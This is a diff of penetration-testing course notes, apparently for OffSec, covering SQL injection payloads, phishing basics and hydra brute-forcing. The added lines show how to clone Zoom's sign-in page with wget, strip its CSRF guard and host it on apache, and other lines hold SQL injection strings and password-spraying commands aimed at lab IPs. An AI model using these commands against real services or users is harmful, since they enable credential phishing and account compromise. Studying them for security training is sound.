@@ -466,7 +466,24 @@
 - Blind-based (boolean or time-based)
   - `offsec' AND 1=1 -- //`: return true if record exist
   - `offsec' AND IF (1=1, sleep(3),'false') -- //`: sleep 3 reconds if true
+    
 ### 11. Phishing Basics
+- broad phishing (mass attacks) and spear phishing (targeted attacks).
+- smishing= (SMS phishing), vishing (voice phishing), and deepfake
+- objective: malicious code or stealing login credentials
+- email domain failter, file attachment
+- Malicious Office Macros (Macro). Mark of the Web (MotW）a file attribute set by Windows when a file is downloaded from an external source.
+- Malicious files SCR files, HTA files, and JScript files
+- `wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"`: Cloning the password reset page, using the link sent to us by Zoom
+- `sudo python -m http.server 80`
+- remove csrfGuard code
+- move phishing page to our web server
+  ```
+  mv -f * /var/www/html
+  systemctl start apache2
+  cd /var/www/html
+  ```
+- 
 ### 12. Client-site attacks
 ### 13. Locating public exploits
 ### 14. Fixing exploits
@@ -480,9 +497,8 @@
       `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
     - password spraying > enumerate username from a valid password
       `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
-    - ddd
-    - ddd
-    - ddd
+   `  
+    - 
 ### 17. Windows Privilege Escalation
     - Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)
     - Enumeration
